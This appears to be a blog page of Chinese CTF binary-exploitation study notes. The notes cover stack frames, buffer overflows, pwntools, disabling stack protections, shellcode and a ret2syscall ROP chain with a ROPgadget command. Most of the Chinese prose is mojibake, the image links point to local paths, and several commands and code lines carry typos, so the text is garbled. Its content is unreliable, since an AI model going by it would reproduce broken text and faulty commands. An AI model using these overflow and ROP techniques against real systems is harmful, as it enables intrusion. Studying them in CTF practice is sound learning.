src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170832516.png" alt="image-20230208170832516"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208172413117.png" alt="image-20230208172413117"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208173923251.png" alt="image-20230208173923251"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208173818672.png" alt="image-20230208173818672"></p><p>Cè¯­è¨€å‡½æ•°æ ˆå¸§<br>æ ˆå¸§ï¼šè®°å½•ä¸€ä¸ªå‡½æ•°æ­¤æ—¶çš„çŠ¶æ€ä¿¡æ¯<br>å‡½æ•°çš„æ ˆåº•ç”±EBPæˆ–RBPä¿å­˜<br>å‡½æ•°çš„æ ˆé¡¶ç”±ESPæˆ–RSPä¿å­˜</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209094759828.png" alt="image-20230209094759828"></p><p>32ä½è§†å›¾<br>å­å‡½æ•°æ‰€ç”¨å‚æ•°ä¿å­˜åœ¨çˆ¶å‡½æ•°æ ˆå¸§çš„æœ«å°¾<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209100855874.png" alt="image-20230209100855874"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209101728223.png" alt="image-20230209101728223"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102340553.png" alt="image-20230209102340553"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102615915.png" alt="image-20230209102615915"></p><p>push ebpä¿æŒçˆ¶å‡½æ•°æ ˆåº•çš„ç©ºé—´<br>sumå‡½æ•°è°ƒç”¨å®Œåéœ€è¦æ¢å¤mainå‡½æ•°çš„ä¿¡æ¯ï¼Œå³åœ¨è°ƒç”¨sumå‡½æ•°å‰éœ€å°†mianå‡½æ•°æ ˆåº•å‹å…¥ã€‚<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209103333679.png" alt="image-20230209103333679"></p><p>æ ˆçš„æ ˆé¡¶ä¸€å®šæ˜¯å½“å‰æ‰§è¡Œå‡½æ•°æ‰€å±çš„æ ˆå¸§ã€‚<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209104000217.png" alt="image-20230209104000217"></p><p>æ— éœ€èˆå¼ƒåªéœ€æ ‡è®°ä¸ºä¸éœ€ä½¿ç”¨å€¼å³å¯â€”â€”&gt;æ‰©å¤§espåˆ°ebpå¤„ï¼ˆé¿å¼€å±€éƒ¨å˜é‡å­˜å‚¨ç©ºé—´ï¼‰<br><strong>æ³¨æ„ï¼šæ­¤è¿‡ç¨‹ä¸­å˜åŒ–ä¸ºå¯¹åº”å€¼çš„åœ°å€å­˜å‚¨åœ¨ebpä¸­â€”â€”&gt;å¯¹åº”å€¼å­˜å‚¨åœ¨ebpä¸­</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209105139584.png" alt="image-20230209105139584"></p><p>ebpå‡å°ä¸€ä¸ªå­—é•¿ï¼›espåŠ ä¸€ä¸ªå­—é•¿ã€‚é€šè¿‡returnæŒ‡ä»¤å°†return addresså¼¹å‡ºä¿å­˜åœ¨eapï¼ˆæŒ‡ä»¤å¯„å­˜å™¨ï¼‰ä¸­<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209110221569.png" alt="image-20230209110221569"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209110919361.png" alt="image-20230209110919361"></p><p>callæŒ‡ä»¤è‡ªå¸¦ä¿å­˜è¿”å›åœ°å€ã€‚<br>leaveï¼šå°†esp ebpæ”¾äºåŒä¸€ä½ç½®åpopebpã€‚<br>popæ€»æ˜¯å°†espæŒ‡å‘çš„å€¼å¯¹åº”çš„1å­—é•¿æ•°æ®ä¼ å…¥åˆ°ç›®æ ‡ä½ç½®</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209112610898.png" alt="image-20230209112610898"></p><p><strong>ç¼“å†²åŒºæº¢å‡ºä¸­</strong> <strong>æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºæµæ ¸å¿ƒï¼š</strong><br>å½“å­å‡½æ•°è¿”å›çˆ¶å‡½æ•°æ—¶ä¼šå°†<em>Ruturn Adress</em>ä¸­çš„å€¼è¿”å›åˆ°PCå¯„å­˜å™¨eipï¼ˆ32ä½ï¼‰ä¸­ï¼Œå½“eipä¸­å€¼å†™å…¥ç›®æ ‡å€¼çš„åœ°å€ï¼Œæ—¢å¯<em>å®Œæˆç¨‹åºæ‰§è¡Œæµçš„æ§åˆ¶</em>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230216235806404.png" alt="image-20230216235806404"></p><p>ä¸¾ä¾‹æ¼”ç¤ºï¼š<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219153353227.png" alt="image-20230219153353227"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> str[<span class="number">8</span>];</span><br><span class="line">   read (<span class="number">0</span>,str,<span class="number">24</span>);</span><br><span class="line">   retrun <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶äº§ç”Ÿsegmentation faultï¼ˆæ®µé”™è¯¯ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219154052743.png" alt="image-20230219154052743"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230219154202756.png" alt="image-20230219154202756"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219161736349.png" alt="image-20230219161736349"></p><p>å®‰å…¨ä¿æŠ¤æªæ–½ï¼ˆæ‹¿åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¹‹åå…ˆæ£€æŸ¥ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219165330509.png"></p><p><strong>æ³¨æ„</strong>ï¼š<em>å‡ºç°getså‡½æ•°å¿…æœ‰æ ˆæº¢å‡ºï¼</em>strartå‡½æ•°æ— æ³•F5ï¼ˆç¼–å†™æ—¶å·²ç”¨æ±‡ç¼–ä»£ç å®ç°ï¼‰<br>vulnerableâ€”â€”&gt;å¯æ€œå—å®³è€…å‡½æ•°æ~</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002608337.png" alt="image-20230221002608337"></p><p>ctrl+Aåï¼šå¯çœ‹Cå’Œæ±‡ç¼–æ¯”è¾ƒ<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002832185.png" alt="image-20230221002832185"></p><p>ctrl+sâ€“&gt;ä¿å­˜<br>(Fn+)shift+F12-&gt;æ‰“å¼€å­—ç¬¦ä¸²ç•Œé¢ï¼ˆASCIIèŒƒå›´å†…çš„å­—ç¬¦ä¸²ï¼‰<br>æ‰“å¼€ç›®æ ‡æ–‡ä»¶å¾—å…³é”®å¥é€å±‚å‰–æåæ±‡ç¼–getå®Œæ•´mainä½“-&gt;end<br>pwntools:ncè½¬åˆ°é—®é¢˜å˜é‡æœ¬ä½“<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160248520.png" alt="image-20230221160248520"></p><p>CTFå»ºè®®ï¼špip2+pip3å‡å®‰è£…<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160924626.png" alt="image-20230221160924626">+<strong>ä»£ç†åœ°å€å¯è¿›è¡Œå®‰è£…</strong>vi</p><p>æ‹¿åˆ°é¢˜ç›®â€”â€”&gt;å…ˆæ‹¿åˆ°æœ¬åœ°shellâ€”â€”&gt;pwntoolsæ”»å‡»â€”â€”&gt;ioæœ¬åœ°åˆ‡æ¢ä¸ºè¿œç¨‹ï¼ˆè„šæœ¬ä¸å˜ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221162513214.png" alt="image-20230221162513214"></p><p>é“¾æ¥ï¼šprocess()-&gt;æœ¬åœ°ï¼›remoteï¼ˆï¼‰â€”&gt;è¿œç¨‹<br>å‡½æ•°ï¼š<br>io.recvline() æ¥æ”¶ä¸€è¡Œå­—ç¬¦ä¸²ï¼›           io.recvï¼ˆï¼‰æ¥æ”¶å¤šè¡Œå­—ç¬¦ä¸²<br>io.send() <strong>æ³¨æ„ï¼šå‡½æ•°å†…éƒ¨åªèƒ½ä¸ºå­—èŠ‚æµï¼ˆå³ä¸ºäºŒè¿›åˆ¶è¡¨ç¤ºï¼‰</strong><br>io.send(p32(0)+bâ€ â•°(<em>Â°â–½Â°</em>)â•¯â€”â€”&gt;è¡¨ç¤ºbiteå¯¹è±¡â€)<br>io.sendline()â€”â€”&gt;ä¸€ç›´è¯»å–ç›´åˆ°\0æˆ–\n;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165139013.png" alt="image-20230221165139013"></p><p>nc toolsåœ°å€ â—â—â—flagéšè—åœ¨å…¶ä¸­â—â—â—<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165745894.png" alt="image-20230221165745894"></p><p>python3å¼€  remote(â€œipâ€,ç«¯å£)<br>ç‰¹æ®Šæ§åˆ¶ç¬¦\râ€”â€”&gt; è¾“å‡ºå½“å‰è¡ŒåæŒç»­è¿›è¡Œæ¸…ç©º<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171244473.png" alt="image-20230221171244473"></p><p>base64å·¥å…·ï¼ˆpwntoolså·¥å…·ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171442165.png" alt="image-20230221171442165"></p><p>â—BASE64:åŒ…å«å¤§å†™å­—æ¯ï¼ˆA-Zï¼‰,å°å†™å­—æ¯ï¼ˆa-zï¼‰ï¼Œæ•°å­—ï¼ˆ0-9ï¼‰ä»¥åŠ+&#x2F; ä¸€èˆ¬å¸¦&#x3D;&#x3D;<br>â—BASE32:åªæœ‰å¤§å†™å­—æ¯ï¼ˆA-Zï¼‰å’Œæ•°å­—234567 ä¸€èˆ¬å¸¦&#x3D;&#x3D;&#x3D;<br>â—BASE16å³ä¸º16è¿›åˆ¶<br><strong>å½“ASCllç”¨BaseåŠ å¯†è¾¾ä¸åˆ°æ‰€å¯¹åº”çš„ä½æ•°çš„æ—¶å€™ç”¨&#x3D;å·è¡¥é½</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221234220854.png" alt="image-20230221234220854"></p><blockquote><p>cd â€œä½ æƒ³è¦è¿›çš„ç›®å½•â€ &#x2F;&#x2F;å½“ç›®å½•åç§°ä¸­å«æœ‰ç©ºæ ¼ã€ä¸­æ–‡æˆ–å…¶å®ƒ<a href="https://baike.baidu.com/item/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/112715?fromModule=lemma_inlink">ç‰¹æ®Šå­—ç¬¦</a>æ—¶è¯·ç”¨<a href="https://baike.baidu.com/item/%E5%8F%8C%E5%BC%95%E5%8F%B7/10758658?fromModule=lemma_inlink">åŒå¼•å·</a>åŒ…æ‹¬</p><p>ä»¥ä¸‹æ˜¯æœ€å¸¸ç”¨çš„å‡ ä¸ªç›®å½•çš„å†™æ³•ï¼š</p><p>&#x2F; ä»£è¡¨<a href="https://baike.baidu.com/item/%E6%A0%B9%E7%9B%AE%E5%BD%95/6061330?fromModule=lemma_inlink">æ ¹ç›®å½•</a></p><p>. å½“å‰ç›®å½•</p><p>.. ä¸Šçº§ç›®å½•</p><p>~ å½“å‰ç”¨æˆ·çš„é»˜è®¤å·¥ä½œç›®å½•</p><p>ç›®å½•å¯ä»¥çœç•¥ä¸å†™ï¼Œ ä¸cd ~ æœ‰ç›¸åŒçš„æ•ˆæœ</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222002023021.png" alt="image-20230222002023021"></p><p>å…³é—­æ ‡å‡†è¾“å…¥è¾“å‡ºçš„ç¼“å†²åŒº ä½¿å¾—å…¶ä¸­å†…å®¹å¯ä»¥ç«‹é©¬æ˜¾ç¤ºå‡ºæ¥ ctrl+#è°ƒå°å­—ä½“<br>ä¸‹æ–­ç‚¹æ–¹å¼ï¼špwndbgä¸­b *+ä¸€ä¸ªåœ°å€ æˆ–è€…b + ä¸€ä¸ªå‡½æ•°<br>å…ˆä¸‹æ–­ç‚¹årun  gdbä¸­è¿è¡Œè¾“å…¥é¦–å­—æ¯å³å¯  ä¾‹ï¼šnâ€”â€”&gt;æ­¥è¿‡    sâ€”â€”&gt;standin<br>ä¸‹æ–­ç‚¹ï¼šbï¼ˆbreakpointï¼‰  * +åœ°å€&#x2F;å‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222191527599.png" alt="image-20230222191527599"></p><p>æ­¤æ—¶å¯ä¿®æ”¹éƒ¨åˆ†ä¸ºbufferï¼ˆ8å­—èŠ‚ï¼‰å³eaxåˆ°ebpéƒ¨åˆ†ï¼ˆ16å¤§å°ï¼‰è¦†ç›–æ—¶éœ€+4ï¼ˆè¦†ç›–ebpï¼‰<br>æŒç»­å‘ä¸‹å†™<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075312799.png" alt="image-20230223075312799">æ‰¾åˆ°åé—¨å‡½æ•°system æ³¨ï¼šå¯ä¸æ˜¯æ¬¡æ¬¡è¿™ä¹ˆä¾¿å®œçš„å“¦ğŸ¤£<br>syetemè¿”å›å­—ç¬¦ä¸²&#x3D;åœ¨shellä¸­ç›´æ¥æ‰§è¡Œå­—ç¬¦ä¸² pwdï¼šæ‰“å°å·¥ä½œç›®å½•<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075541707.png" alt="image-20230223075541707"></p><p>ä½¿å¾—vualable returnåˆ°shellå³å¯<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223103831511"></p><p>pï¼ˆpackï¼‰å¯¹æ•°æ®è¿›è¡Œæ‰“åŒ…å˜ä¸ºå­—ç¬¦å‹æ•°æ® ï¼› ä¾‹ï¼šp32ï¼ˆ0x8048522ï¼‰æ‰“åŒ…ä¸º32biteä½å­—ç¬¦</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223104016114"></p><p>gccï¼šLinuxç¯å¢ƒä¸‹çš„ä¸€æ¬¾ç¼–è¯‘å™¨ã€‚<br>ctrl+d é€€å‡ºpythonäº¤äº’ç¯å¢ƒ!<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112513513.png" alt="image-20230223112513513"><br>bssé»˜è®¤æ ˆå¯æ‰§è¡Œ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230411152517155.png" alt="image-20230411152517155"><br>å…³é—­éšæœºåŒ–ï¼ˆASLRï¼‰</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-fro-stack-protector å…³é—­canary</span></span><br><span class="line"><span class="deletion">-z exexstack æ‰“å¼€æ ˆçš„å¯æ‰§è¡Œæƒé™</span></span><br><span class="line"><span class="deletion">-no-pie å…³é—­pieï¼ˆç¨‹åºç¼–è¯‘æ—¶æ‰“å¼€pie å°†åœ°å€éšæœºåŒ–ä¸ºæ— å…³ä»£ç  å³éšæœºåŒ–elfæ–‡ä»¶ï¼‰</span></span><br><span class="line"><span class="deletion">-g å¸¦ä¸Šè°ƒè¯•ä¿¡æ¯ è°ƒè¯•æ—¶å¯ä»¥çœ‹è§æºä»£ç ï¼ˆret2stack.cæœªåˆ é™¤æƒ…å†µä¸‹ï¼‰</span></span><br><span class="line"><span class="deletion">-o è¾“å‡ºç›®æ ‡æ–‡ä»¶</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412200146471.png" alt="image-20230412200146471">chmod +x ç»™æƒé™<br>shellcode(åç§»+è¿”å›åœ°å€)</p><p>åœ°å€ç©ºé—´éšæœºåŒ–&lt;â€”â€”æ“ä½œç³»ç»Ÿå®ç°  å¯è¾“å…¥0æ£€æŸ¥ASLRæ˜¯å¦å…³é—­<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223115046186.png" alt="image-20230223115046186"></p><p>åŠ¨æ€é“¾æ¥åº“çœ‹ä¸º1 åœ°å€éšæœºåˆ†é… æ ˆåŒï¼ˆåç§»å€¼éšæœºåœ°å€æœªçŸ¥ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230223232443609"></p><p>bssç”¨æ¥å­˜æ”¾å…¨å±€å˜é‡  å¯è¯»å¯å†™å¯æ‰§è¡Œ shellcodeè¿”å›åˆ°bss<br>shellcodeè¿”å›æ ˆåŒºç”±äºaslrçš„ä¿æŠ¤ä¸å¯å¾—åˆ°æ‰€éœ€æ ˆåœ°å€ï¼Œè¿”å›bsså³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230224081202824"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224081246465.png" alt="image-20230224081246465"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112708517.png" alt="image-20230223112708517"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223113034773.png" alt="image-20230223113034773"></p><p>åœ¨pwné‡Œï¼Œä¿æŠ¤ä¸€å…±æ˜¯å››ç§åˆ†åˆ«æ˜¯RELROã€Stackã€NXã€PIEã€‚<br>1.RELROï¼ˆReLocation Read-Onlyï¼‰ï¼šåˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œç¬¬ä¸€ç§æƒ…å†µæ˜¯Partial RELROï¼Œè¿™ç§æƒ…å†µæ˜¯éƒ¨åˆ†å¼€å¯å †æ ˆåœ°å€éšæœºåŒ–ï¼Œgotè¡¨å¯å†™ï¼Œç¬¬äºŒç§ï¼ŒFull RELROæ˜¯å…¨éƒ¨å¼€å¯ï¼Œgotè¡¨ä¸å¯å†™ï¼ŒGotè¡¨æ˜¯å…¨å±€åç§»è¡¨ï¼Œé‡Œé¢åŒ…å«çš„æ˜¯å¤–éƒ¨å®šä¹‰çš„ç¬¦å·ç›¸åº”çš„æ¡ç›®çš„æ•°æ®æ®µä¸­ï¼ŒPLTè¡¨ï¼Œæ˜¯è¿‡ç¨‹é“¾æ¥è¡¨&#x2F;å†…éƒ¨å‡½æ•°è¡¨ï¼Œlinuxå»¶è¿Ÿç»‘å®šï¼Œä½†æ˜¯æœ€åè¿˜æ˜¯è¦è¿æ¥åˆ°Gotï¼ŒPLTè¡¨åªæ˜¯ä¸ºä¸€ä¸ªè¿‡æ¸¡çš„ä½œç”¨ã€‚<br>2.Stackï¼ˆcanaryï¼‰ï¼šè¿™ä¸ªä¿æŠ¤å…¶å®å°±æ˜¯åœ¨ä½ è°ƒç”¨çš„å‡½æ•°çš„æ—¶å€™ï¼Œåœ¨æ ˆå¸§ä¸­æ’å…¥ä¸€ä¸ªéšæœºæ•°ï¼Œåœ¨å‡½æ•°æ‰§è¡Œå®Œæˆè¿”å›ä¹‹å‰ï¼Œæ¥æ ¡éªŒéšæœºæ•°æ˜¯å¦è¢«æ”¹å˜ï¼Œæ¥åˆ¤æ–­æ˜¯å¦è¢«æ ˆæº¢å‡ºï¼Œè¿™ä¸ªæˆ‘ä»¬ä¹Ÿä¿—ç§°ä¸ºcanaryï¼ˆé‡‘ä¸é›€ï¼‰ï¼Œæ ˆä¿æŠ¤æŠ€æœ¯ã€‚<br>3.NXï¼ˆno executeï¼‰ï¼šä¸ºæ ˆä¸å¯çŸ¥æ€§ï¼Œä¹Ÿå°±æ˜¯æ ˆä¸Šçš„æ•°æ®ä¸å¯ä»¥å½“ä½œä»£ç åŒºæ‰§è¡Œçš„ä½œç”¨,NXæ‰“å¼€è¯´æ˜æ ˆä¸Šå·²ç»ç»™å‡ºå…¨éƒ¨å¯ç”¨çš„systemï¼ˆï¼‰ã€â€&#x2F;bin&#x2F;shâ€ï¼Œä¸å¯è‡ªè¡Œå†™å…¥ã€‚<br>4.PIEï¼ˆPosition Independent Executableï¼‰ï¼šPIEçš„ä¸­æ–‡å«åšï¼Œåœ°å€æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ˜¯é’ˆå¯¹.textï¼ˆä»£ç æ®µï¼‰ï¼Œ.dataï¼ˆæ•°æ®æ®µï¼‰ï¼Œ.bssï¼ˆæœªåˆå§‹åŒ–å…¨å±€å˜é‡æ®µï¼‰æ¥åšçš„ä¿æŠ¤ï¼Œæ­£å¸¸æ¯ä¸€æ¬¡åŠ è½½ç¨‹åºï¼ŒåŠ è½½åœ°å€æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯PIEä¿æŠ¤å¼€å¯ï¼Œæ¯æ¬¡ç¨‹åºå¯åŠ¨çš„æ—¶å€™éƒ½ä¼šå˜æ¢åŠ è½½åœ°å€ã€‚</p><p>context.arch &#x3D; â€˜â€œamch64â€â€”â€”&gt;å°†ä½æœºå™¨ç è½¬ä¸º64ä½<br>vmmapæ˜¾ç¤ºè™šæ‹Ÿå†…å­˜çš„åˆ†å¸ƒ<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224125905589.png" alt="image-20230224125905589"></p><p>32ä½ 1å­—é•¿&#x3D;4bite 64ä½ 1å­—é•¿ &#x3D; 8bite pushæ ˆå‘ä¸Šå¢é•¿popå‘ä¸‹å¢é•¿ï¼ˆå‡å°ï¼‰<br>leaveæ‰§è¡Œï¼š1.å°†espå½’ä½è‡³ebpä½  2.pop ebpå°†previous ebpä¸­çš„å€¼å­˜æ”¾åˆ°ebpä¸­ 3.ebpè¿”å›çˆ¶å‡½æ•°æ ˆåº•<br>espè‡ªåŠ¨+1å­—é•¿ï¼ˆæ‰§è¡Œpopï¼‰<br>returnçš„ä½œç”¨ï¼šå°†å½“å‰å‡½æ•°æ ˆé¡¶ä¸­çš„å€¼popè¿”å›åˆ°eipå¯„å­˜å™¨ä¸­ ç¨‹åºæ­£åœ¨æ‰§è¡Œçš„åœ°å€å˜æˆreturn address<br>return addressä¸­çš„å€¼å­˜æ”¾åˆ°eipä¸­ eipè¿”å›åˆ°ä¸Šä¸€ä¸ªå‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226153916098.png" alt="image-20230226153916098"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226154515139.png" alt="image-20230226154515139"></p><p>pwndbgçš„å¥½å¤„æ~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226155524945.png" alt="image-20230226155524945"><br>è‡ªåŠ¨ç¼–å†™payloadï¼ˆé»˜è®¤ç»“æœä¸ºx86ä¸‹32biteå¤§å°) printï¼ˆshellcraft.shï¼ˆ) )</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230226155734820.png" alt="image-20230226155734820"></p><p>asmå°†æ±‡ç¼–ç è½¬å˜ä¸ºæœºå™¨ç åå‘é€è‡³è¿œç¨‹å†…å­˜è™šæ‹Ÿç©ºé—´çš„æŸä¸ªä½ç½®<br>l.just(xï¼Œy)ä»å·¦å‘å³ï¼Œå·¦ç«¯æ•°æ®ä¸å˜å¯¹å³è¾¹çš„æ•°æ®ä¸æ–­è¿›è¡Œå¡«å…… xï¼šå¡«å……çš„æ•°æ®é•¿åº¦ yï¼šå¡«å……å†…å®¹<br>cat.flag.txt å¾—åˆ°flagå†…å®¹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226162609326.png" alt="image-20230226162609326"></p><p>å…³é—­aslræŒ‡ä»¤ã€‚<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230306232744633.png" alt="image-20230306232744633"></p><p>å…³é—­canaryï¼ˆå †æ ˆå…±äº«åº“ï¼‰pie(å…±äº«åº“ç¼–è¯‘æ—¶ å°†elfæ–‡ä»¶æœ¬ä½“çš„è½½å…¥åœ°å€éšæœºåŒ–)  - 0è¾“å‡ºç›®æ ‡æ–‡ä»¶<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307000253788.png" alt="image-20230307000253788"></p><p>ç»™å¯æ‰§è¡Œæ–‡ä»¶æƒé™ .&#x2F;è¿è¡Œshell<br>ctrl+c -&gt;å‘å½“å‰æ‰§è¡Œè¿›ç¨‹å‘é€ä¸€ä¸ªç»ˆæ­¢ä¿¡å·ï¼ˆå¤åˆ¶ctrl+shift+cï¼‰<br>crl+d é€€å‡ºå½“å‰shell<br>context.arch &#x3D; â€œamd64â€(å‘Šè¯‰pyç³»ç»Ÿæ¶æ„ã€ç³»ç»Ÿä½æ•°ã€‘)<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230310080407959.png" alt="image-20230310080407959">å…³é—­æ ‡å‡†ç¼“å†²åŒºå¾—åˆ°è¾“å‡ºå€¼</p><p>system()å‡½æ•°è°ƒç”¨&#x2F;bin&#x2F;shæ¥æ‰§è¡Œå‚æ•°æŒ‡å®šçš„å‘½ä»¤ï¼Œ&#x2F;bin&#x2F;sh ä¸€èˆ¬æ˜¯ä¸€ä¸ªè½¯è¿æ¥ï¼ŒæŒ‡å‘æŸä¸ªå…·ä½“çš„shellï¼Œæ¯”å¦‚bashï¼Œ-cé€‰é¡¹æ˜¯å‘Šè¯‰shellä»å­—ç¬¦ä¸²commandä¸­è¯»å–å‘½ä»¤ï¼› åœ¨è¯¥commandæ‰§è¡ŒæœŸé—´ï¼ŒSIGCHLDæ˜¯è¢«é˜»å¡çš„ï¼Œå¥½æ¯”åœ¨è¯´ï¼šhiï¼Œå†…æ ¸ï¼Œè¿™ä¼šä¸è¦ç»™æˆ‘é€SIGCHLDä¿¡å·ï¼Œç­‰æˆ‘å¿™å®Œå†è¯´ï¼› åœ¨è¯¥commandæ‰§è¡ŒæœŸé—´ï¼ŒSIGINTå’ŒSIGQUITæ˜¯è¢«å¿½ç•¥çš„ï¼Œæ„æ€æ˜¯è¿›ç¨‹æ”¶åˆ°è¿™ä¸¤ä¸ªä¿¡å·åæ²¡æœ‰ä»»ä½•åŠ¨ä½œ</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230325231231643.png" alt="image-20230325231231643"></p><p>åŠ¨æ€é“¾æ¥åº“æœ¬èº«å°±æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚<br>my_putså‡½æ•°è¾“å‡ºè¿‡ç¨‹ï¼ˆæ— å„æ ˆä¿æŠ¤å¯è€ƒè™‘ropï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153211276.png" alt="image-20230409153211276"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153739815.png" alt="image-20230409153739815"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409163357731.png" alt="image-20230409163357731"></p><p>ROPgadget è·å–textæ®µæ‰€éœ€æ±‡ç¼–ä»£ç ï¼ˆretâ€”â€”&gt;å°†æ ˆä¸­ä¿¡æ¯å¼¹åˆ°eipä¸­ï¼‰ eaxã€ebxä¼˜å…ˆã€ROPæ€»ä¼šè‡³æº¢å‡ºretaddråã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230409171200929"></p><p>å¼‚æˆ–ï¼ˆxorï¼‰å¸¸ç”¨äºæ¸…ç©ºç¼“å†²åŒº<br>flat()å‡½æ•° æ¥æ”¶ä¸€ä¸ªåˆ—è¡¨å‚æ•°å°†åˆ—è¡¨ä¸­çš„æ¯ä¸€é¡¹éƒ½è½¬ä¸ºå­—èŠ‚å‹æ•°æ®å¹¶ä¸”è‡ªåŠ¨æŠŠä¸è¶³ä¸€å­—èŠ‚æ•°æ®è¿›è¡Œå¡«è¡¥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">io</span> = flatï¼ˆ[b&#x27;A&#x27;*<span class="number">112</span>,pop_eax_ret,<span class="number">0</span>xb,pop_eax_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int_80h]ï¼‰</span><br></pre></td></tr></table></figure><p>grepåŠŸèƒ½ï¼šå¯¹è¾“å…¥è¡Œä¸­å«æœ‰ç”¨æˆ·è‡ªå®šå‚æ•°çš„è¡Œè¿›è¡Œå…¨éƒ¨è¾“å‡º</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget</span> <span class="built_in">--binary</span> <span class="string">ret2syscall</span> <span class="built_in">--only</span> <span class="string">&quot;pop|ret&quot;</span> | <span class="string">head</span></span><br></pre></td></tr></table></figure><p>sos 